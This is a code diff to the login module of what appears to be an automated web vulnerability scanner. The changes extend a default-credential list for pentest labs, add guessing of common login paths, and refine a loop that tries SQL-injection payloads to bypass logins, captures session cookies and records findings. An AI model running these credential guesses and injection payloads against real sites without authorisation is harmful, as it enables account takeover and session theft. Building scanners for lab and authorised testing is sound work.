@@ -11,16 +11,43 @@ class AuthHandler:
         self.report_builder = VulnerabilityBuilder()
         self.cookies = None
         self.auth_token = None
+        # Common default credentials for pentest labs and popular web apps
         self.default_creds = [
-            ("admin", "admin"), ("admin", "password"),
-            ("root", "root"), ("user", "user"),
-            ("admin", "admin123"), ("admin", "123456")
+            # DVWA / generic labs
+            ("admin",    "password"),
+            ("admin",    "admin"),
+            ("admin",    "admin123"),
+            ("admin",    "123456"),
+            ("admin",    "password123"),
+            # Root variations
+            ("root",     "root"),
+            ("root",     "toor"),
+            # Generic user
+            ("user",     "user"),
+            ("user",     "password"),
+            ("test",     "test"),
+            # Juice Shop / OWASP
+            ("admin@juice-sh.op", "admin123"),
+            # WordPress defaults
+            ("admin",    "admin"),
+            # WebGoat
+            ("guest",    "guest"),
+            ("webgoat",  "webgoat"),
+            # BWAPP
+            ("bee",      "bug"),
         ]
-        self.user_selectors = 'input[type="email"], input[name*="user"], input[name*="email"], input#email, input[placeholder*="Email" i]'
+        self.user_selectors = (
+            'input[type="email"], input[name*="user"], input[name*="email"], '
+            'input#email, input[placeholder*="Email" i], input[name="username"], '
+            'input[id*="user" i], input[id*="login" i]'
+        )
         self.pass_selectors = 'input[type="password"], input[name*="pass"]'
-        self.submit_selectors = 'input[type="submit"], button[type="submit"], button:has-text("Login"), input[name="Login"], input[value="Login"]'
+        self.submit_selectors = (
+            'input[type="submit"], button[type="submit"], '
+            'button:has-text("Login"), button:has-text("Sign in"), '
+            'input[name="Login"], input[value*="Login"], input[value*="Sign"]'
+        )
         self.collected_findings = []
-
         self.last_authenticated_url = None
 
     async def perform_login(self, page: Page, credentials: dict = None) -> bool:
@@ -29,8 +56,19 @@ class AuthHandler:
     
         if not has_form:
             self.logger.info("[Auth] 🕵️ No login form detected, searching for login page...")
-            # ลองไปที่ /login.php สำหรับ DVWA หรือ /#/login สำหรับ Juice Shop
-            paths = ["/login", "/signin", "/login.php", "/user/login", "/account/login", "/auth/login", "/users/sign_in", "/#/login", "/#/signin"]
+            paths = [
+                # Standard paths
+                "/login", "/signin", "/sign-in",
+                "/#/login", "/#/signin",
+                # PHP / CMS paths
+                "/login.php", "/admin/login.php", "/wp-login.php",
+                "/administrator", "/admin",
+                # App framework paths
+                "/user/login", "/account/login", "/auth/login",
+                "/users/sign_in", "/session/new",
+                # DVWA specific (redirected to login.php at root)
+                "/dvwa/login.php",
+            ]
             base_url = page.url.split('#')[0].rstrip('/')
             
             for path in paths:
@@ -168,76 +206,81 @@ class AuthHandler:
             "' UNION SELECT NULL, 'admin', 'password'--",
         ]
         
-        user_selectors = 'input[type="email"], input[name*="user"], input[name*="email"], input#email'
-        pass_selectors = 'input[type="password"], input[name*="pass"]'
-        submit_selectors = 'button[type="submit"], button#loginButton, button:has-text("Login")'
+        user_selectors   = 'input[type="email"], input[name*="user"], input[name*="email"], input#email, input[name="username"]'
+        pass_selectors   = 'input[type="password"], input[name*="pass"]'
+        # Cover <button> AND <input type="submit"> — DVWA uses the latter
+        submit_selectors = (
+            'button[type="submit"], button#loginButton, button:has-text("Login"), '
+            'input[type="submit"], input[value*="Login"], input[value*="Sign in"]'
+        )
 
         for payload in payloads:
             try:
-                # 1. จัดการ Modal หรือ Pop-up ก่อนเริ่ม
+                # 1. Dismiss modals
                 await self._dismiss_initial_modals(page)
                 
-                # 2. เก็บ URL ของหน้า Login ไว้ทำรายงาน
-                current_login_url = page.url 
+                # 2. Remember login URL
+                current_login_url = page.url
 
-                # 3. หาทางเข้าหน้า Login (ถ้ายังไม่อยู่ในหน้านั้น)
+                # 3. Navigate to login page if not already there
                 if "login" not in page.url.lower():
                     login_link = page.locator('a:has-text("Login"), a:has-text("Sign in")').first
                     if await login_link.is_visible():
                         await login_link.click()
                         await page.wait_for_load_state("networkidle")
                     else:
-                        # ถ้าหาลิงก์ไม่เจอ ให้ลองเดา Path (เฉพาะ Juice Shop หรือ Next.js)
                         await page.goto(f"{page.url.split('#')[0]}#/login", wait_until="networkidle")
 
-                # 4. ระบุ Element
+                # 4. Locate form elements
                 user_input = page.locator(user_selectors).first
                 pass_input = page.locator(pass_selectors).first
                 submit_btn = page.locator(submit_selectors).first
 
-                if await user_input.is_visible():
-                    await user_input.fill(payload)
-                    await pass_input.fill("anything")
-                    await submit_btn.click()
+                # Bail early if no username input visible (not a login form)
+                if not await user_input.is_visible(timeout=3000):
+                    continue
+
+                await user_input.fill(payload)
+                await pass_input.fill("anything")
+                # Fail fast per payload — DVWA input[type=submit] should respond in <5s
+                await submit_btn.click(timeout=5000)
+                
+                await page.wait_for_timeout(2000)
+
+                # 5. Check login success
+                if await self._check_success(page):
+                    self.logger.info(f"✅ SQLi Bypass Success with payload: {payload}")
                     
-                    await page.wait_for_timeout(2000)
+                    # Capture session cookies / token
+                    await self._capture_session(page)
 
-                    # 5. ตรวจสอบว่า Login สำเร็จหรือไม่
-                    if await self._check_success(page):
-                        self.logger.info(f"✅ SQLi Bypass Success with payload: {payload}")
-                        
-                        # เก็บ Session ข้อมูลคุกกี้/Token
-                        await self._capture_session(page)
+                    # Screenshot evidence
+                    import base64
+                    screenshot_bytes = await page.screenshot(type="jpeg", quality=70)
+                    screenshot_b64 = base64.b64encode(screenshot_bytes).decode('utf-8')
 
-                        # --- [เพิ่มจุดที่ต้องแก้: บันทึก Finding] ---
-                        
-                        # ถ่ายภาพหลักฐาน (Screenshot)
-                        import base64
-                        screenshot_bytes = await page.screenshot(type="jpeg", quality=70)
-                        screenshot_b64 = base64.b64encode(screenshot_bytes).decode('utf-8')
+                    # Build finding report
+                    auth_finding = self.report_builder.build(
+                        url=current_login_url,
+                        param="username",
+                        vuln_type="Authentication Bypass via SQL Injection",
+                        payload=payload,
+                        screenshot=screenshot_b64,
+                        details=f"Successfully bypassed authentication using payload: {payload}. This allows unauthorized access to user accounts.",
+                        method="POST",
+                        severity="CRITICAL"
+                    )
 
-                        # สร้าง Finding รายงานผล
-                        auth_finding = self.report_builder.build(
-                            url=current_login_url, 
-                            param="username", 
-                            vuln_type="Authentication Bypass via SQL Injection",
-                            payload=payload, 
-                            screenshot=screenshot_b64, 
-                            details=f"Successfully bypassed authentication using payload: {payload}. This allows unauthorized access to user accounts.",
-                            method="POST",
-                            severity="CRITICAL" 
-                        )
-                        
-                        # ตรวจสอบว่า collected_findings มีการประกาศไว้ใน __init__ หรือยัง
-                        if hasattr(self, 'collected_findings'):
-                            self.collected_findings.append(auth_finding)
-                        
-                        return True # หยุดการลอง payload อื่นเมื่อสำเร็จ
-                        
+                    if hasattr(self, 'collected_findings'):
+                        self.collected_findings.append(auth_finding)
+
+                    return True  # Stop trying — one success is enough
+
             except Exception as e:
                 self.logger.error(f"[-] Error during SQLi Bypass attempt: {e}")
                 continue
         return False
+
 
     async def _capture_session(self, page: Page):
         """เก็บ Cookies และบันทึก URL ล่าสุดไว้"""
